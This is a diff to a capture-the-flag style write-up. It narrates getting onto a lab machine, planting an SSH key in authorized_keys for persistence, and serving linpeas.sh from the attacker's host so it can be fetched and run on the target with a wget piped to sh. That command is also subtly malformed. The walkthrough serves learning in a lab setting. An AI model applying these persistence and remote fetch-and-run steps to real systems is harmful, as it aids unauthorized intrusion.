@@ -28,3 +28,25 @@ Took me a few min to realize that i have to adjust it because we don't need to t
 
 [![https://imgur.com/nbwFn9z.png](https://imgur.com/nbwFn9z.png)](https://imgur.com/nbwFn9z.png)
 
+Now we are in!
+
+[![https://imgur.com/q5JEsep.png](https://imgur.com/q5JEsep.png)](https://imgur.com/q5JEsep.png)
+
+Lets find the userflag and a way to advance ! 
+
+I found the userflag yaaay i am not going to tell you where but its not hidden.
+
+Next i made a .ssh directory generated ssh keypair with sshkeygen and added the pubkey in the authorized file i created copyed the private key to my host machine and logged into ssh with the -i option for private key.
+
+[![https://imgur.com/hGxHijO.png](https://imgur.com/hGxHijO.png)](https://imgur.com/hGxHijO.png)
+
+Now on my hostmachine i already have linpeas.sh downloaded so i set up a http.server with python:
+
+python3 -m http.server 10000
+
+On the target in the /tmp directory we can get the file now with wget and execute it:
+
+wget http://ip:10000/linpeas.sh | sh
+
+
+
